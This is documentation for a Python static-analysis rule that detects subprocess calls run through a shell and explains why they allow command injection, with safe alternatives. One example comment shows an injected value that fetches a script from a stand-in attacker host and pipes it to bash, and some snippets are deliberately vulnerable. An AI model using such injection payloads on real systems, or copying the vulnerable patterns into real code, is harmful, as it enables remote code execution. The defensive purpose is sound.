---
title: "VNX-PY-007 – subprocess with shell=True"
description: "Detect subprocess calls that run a non-constant command line through the shell (shell=True, getoutput, create_subprocess_shell, or an explicit sh -c list), enabling command injection when any interpolated part is user-controlled."
---

## Overview

This rule flags calls to `subprocess.call()`, `subprocess.run()`, `subprocess.Popen()`, `subprocess.check_call()`, and `subprocess.check_output()` that include `shell=True`. When `shell=True` is set, Python passes the entire command to `/bin/sh -c` (on Unix) or `cmd.exe /c` (on Windows) rather than executing the binary directly. This means the shell interprets the command string, processing metacharacters such as `;`, `&&`, `||`, `|`, `$()`, and backticks. If any part of the command string is derived from user input, the attacker can inject additional shell commands. This maps to [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html).

**Severity:** High | **CWE:** [CWE-78 – OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)

## Why This Matters

Command injection via `shell=True` is one of the most impactful vulnerability classes in web applications. The attacker gains the ability to run arbitrary OS commands with the same privileges as the Python process. In a typical deployment this means reading application secrets, exfiltrating database contents, modifying files, pivoting to adjacent services on the internal network, or establishing a reverse shell.

Developers use `shell=True` for convenience — it allows shell features like globbing, pipes, and environment variable expansion in a single string. But the same parsing that makes those features work will also parse an attacker's injected metacharacters. Sanitising user input to remove metacharacters is not a reliable defence because the set of dangerous characters is large and context-dependent (differ between shells, quoting styles, and encoding schemes).

## What Gets Flagged

A subprocess call (`call`, `run`, `Popen`, `check_call`, `check_output`, through the module, an alias or an imported name) with `shell=True` anywhere in the call, including a call broken over several lines, whose command is not a constant string; `subprocess.getoutput`/`getstatusoutput` and `asyncio.create_subprocess_shell` with a non-constant command; and a call whose argument list starts an explicit shell (`["sh", "-c", f"..."]`, `["cmd.exe", "/c", x]`, inline or appended to a list just above).

Not flagged: a constant command (`subprocess.run("make clean", shell=True)`) or a variable assigned only constant strings above, a command variable (or the script name in an explicit `["sh", "-c", name]` list) that the enclosing function proves holds a constant at the call, argument lists without an explicit shell, `shell=False`, commands whose interpolations use `shlex.quote()` (inline, or where the command variable was last assigned), other objects' `run` methods, and mentions in comments or strings.

```python
# FLAGGED: user-controlled filename passed through shell
filename = request.args.get("file")
subprocess.run(f"cat {filename}", shell=True)
# Attacker sends file=foo; curl https://evil.example/shell | bash

# FLAGGED: shell=True on its own line
process = subprocess.Popen(
    command,
    shell=True,
)

# FLAGGED: an explicit shell in the list form
subprocess.Popen(["sh", "-c", f"nslookup {host}"])

# FLAGGED: Popen with shell=True
proc = subprocess.Popen(f"convert {input_file} output.png", shell=True)

# FLAGGED: check_output with shell=True
result = subprocess.check_output(f"grep {pattern} {logfile}", shell=True)
```

## Reading The Function First

The command variable is judged by what it holds at the call, read from the enclosing function (at most 120 lines up), not by how its text was put together. It is not reported when every definition that can reach the call is constant: a literal on every path; the branch an `if`/`elif`/`else` or a conditional expression takes when its condition folds to a constant (integer literals and integer locals assigned once, or a literal tested with `in` / `not in` against a string local); the case a `match` on a constant selects; the element a list index, dict key or `ConfigParser` option actually holds after the appends, pops and assignments above it; a copy of what another name held at that line; and the result of a function in the same file whose every return is constant.

```python
days = request.args.get("days", "7")
keep = 30
if keep // 2 > 10:          # always true
    retention = "14"
else:
    retention = days        # never runs
command = "sh -c " if platform.system() != "Windows" else "cmd.exe /c "
command += f"find /var/log/app -mtime +{retention} -delete"
subprocess.run(command, shell=True)   # not flagged: every part is constant
```

Anything the analysis cannot resolve stays reported: a condition on run-time data, a function in another module, a collection passed to a call or aliased, a value assigned inside `try` or a loop, or rebound by a tuple, `for`, `with` or walrus target.

### Calls that cannot bring data in

A call into code the scan cannot see (another class or module) is treated as **inert**, and its value as a constant, when all of these hold:

- its name is not that of a source (`read*`, `input`, `getenv`, `get_*` of a parameter, header, cookie or value, `query`, `execute`, `popen`);
- every argument is a constant: a literal, or a name the method fixes;
- its receiver is a class, an imported module, or a local built from such a call or from a constructor with constant arguments, and that local is only ever called with constant arguments.

```python
# NOT REPORTED: the helper is given literals only
book = CommandBook.standard()
command = book.entry("listing")
subprocess.run(command, shell=True)

# REPORTED: a run-time argument
command = book.entry(name)

# REPORTED: the receiver was built from, or fed, a run-time value
book = CommandBook(request.args.get("book", ""))
command = book.entry("listing")

# REPORTED: a source-like method name
command = helpers.commands.read_line("command")
```

Anything that fails one of the tests stays reported, so a helper that hands back its argument is never mistaken for a constant.

## Remediation

1. **Pass a list of arguments with `shell=False` (the default).** This bypasses the shell entirely. Python calls `execve()` directly with the program path and an argument vector, so no shell metacharacter parsing occurs. The user-supplied values are passed as arguments to the program, not interpreted by a shell:

```python
import subprocess

# SAFE: list form — shell metacharacters in filename are passed as literals
filename = request.args.get("file")
result = subprocess.run(
    ["cat", filename],
    capture_output=True,
    text=True,
    check=True,
)
```

2. **Validate and restrict input before passing to subprocess.** Even with `shell=False`, validate that the argument is within expected bounds. For file paths, resolve them and confirm they are within an allowed directory:

```python
import subprocess
from pathlib import Path

ALLOWED_DIR = Path("/var/app/uploads").resolve()

def process_file(user_path: str) -> str:
    # Resolve and confirm the path stays within the allowed directory
    target = (ALLOWED_DIR / user_path).resolve()
    if not str(target).startswith(str(ALLOWED_DIR)):
        raise ValueError("Path traversal detected")
    result = subprocess.run(
        ["file", str(target)],
        capture_output=True,
        text=True,
        check=True,
    )
    return result.stdout
```

3. **Use Python standard library functions instead of shell commands.** Many common shell command patterns have direct Python equivalents that are safer and more portable:

```python
from pathlib import Path
import shutil

# Instead of: subprocess.run("cat file.txt", shell=True)
content = Path("file.txt").read_text()

# Instead of: subprocess.run("cp src dst", shell=True)
shutil.copy("src", "dst")

# Instead of: subprocess.run("rm -rf tmpdir", shell=True)
shutil.rmtree("tmpdir")
```

4. **If you need shell features like pipes, use Python's subprocess plumbing.** Chain `subprocess.run` calls or use `subprocess.PIPE` to compose pipelines without invoking a shell:

```python
# Instead of: subprocess.run("ps aux | grep python", shell=True)
ps = subprocess.run(["ps", "aux"], capture_output=True, text=True)
grep = subprocess.run(["grep", "python"], input=ps.stdout, capture_output=True, text=True)
```

## References

- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [OWASP OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [Python docs – subprocess security considerations](https://docs.python.org/3/library/subprocess.html#security-considerations)
- [CAPEC-88: OS Command Injection](https://capec.mitre.org/data/definitions/88.html)
- [MITRE ATT&CK T1059.006 – Command and Scripting Interpreter: Python](https://attack.mitre.org/techniques/T1059/006/)
